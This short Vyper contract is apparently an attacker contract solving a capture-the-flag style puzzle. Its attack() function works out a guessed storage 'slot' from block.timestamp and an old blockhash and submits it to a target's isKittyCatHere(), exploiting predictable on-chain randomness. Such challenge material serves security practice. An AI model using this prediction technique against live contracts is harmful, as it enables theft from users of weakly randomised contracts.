# @version ^0.3.7

interface ICat:
    def catFound() -> bool: view
    def isKittyCatHere(_slot: bytes32): nonpayable

owner: immutable(address)

cat: ICat

@external
@payable
def __init__(_cat: address):
    owner = msg.sender
    self.cat = ICat(_cat)

@external
def attack():
    assert msg.sender == owner, "!owner"
    slot: bytes32 = keccak256(concat(convert(block.timestamp, bytes32), blockhash(block.number - 69)))
    self.cat.isKittyCatHere(slot)
    assert self.cat.catFound(), "cat !found"
